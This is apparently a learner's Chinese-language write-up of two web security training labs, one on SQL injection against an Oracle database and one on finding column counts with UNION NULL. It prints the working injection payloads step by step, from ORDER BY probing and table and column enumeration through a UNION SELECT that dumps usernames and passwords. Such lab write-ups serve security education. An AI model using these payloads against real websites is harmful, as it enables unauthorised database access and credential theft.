Lab: SQL 注入攻击，列出 Oracle 数据库内容
这是PostgreSQL数据库
题目告诉我们需要通过sql注入获取数据库中的信息,以此来获取所有用户的用户名和密码

整体思路和步骤和前面那题一样:都是先确定返回的列数，然后查库名，表名，列名，里面的数据，最后脱库，只是payload有一点不同
先构造: -1'+order+by+1--+
-1'+order+by+2--+
-1'+order+by+3--+
确定有列数为2

(oracle与其他数据库最大区别就是: Oracle 每一条 SELECT 必须带 FROM！不能裸写 select 1,2，必须 select 1,2 from dual 是 Oracle 自带的虚表，没有from后面没有东西的时候用)

然后构造:-1'+union+select+'11',user+from+dual--+
来获取库名
Oracle 里 user 代表当前用户（等价 MySQL 的 database ()、PG 的 current_schema ()）

然后构造:-1'+union+select+'11',table_name+from+all_tables--+来获取所有表
也可以将all_tables替换成user_tables来获取当前用户的下面的表

然后就是:-1'+union+select+'11',column_name+from+user_tab_columns+where+table_name='USERS_XFDNBZ'--+查看表里面的列

最后构造:-1'+union+select+USERNAME_IZZGMA,PASSWORD_EYSFAJ+from+USERS_XFDNBZ--+脱库获取拿到账号密码

用得到的账号密码登入，成功通关

Lab:SQL注入UNION攻击，确定查询返回的列数

这一题要求通过通过注入union来查询返回列数

构造方式和之前一样，我主要分享一下我遇到的一些问题:

(1)构造-1' order by 3--+得出返回的列数，但是却不能通关，

查询一下，发现必须用 UNION SELECT NULL 这种方式完成攻击才能判定通关，order by 只是侦查手段，不算完成这个实验要求的攻击动作,所以无法通关

(2)构造:-1' union selec 'abc','abc','abc'--+会报错

经过资料查询和尝试，发现是因为abc是字符型，如果原查询列里面是数字型，就会报错,经过测试,我发现第一个空和第三个空是数字型，第二个空不限


应该是第一个是序号，第二个是商品名称，第三个是价格
但是使用NULL就不需要考率类型，直接构造
-1' union select NULL,NULL,NULL--+即可通关
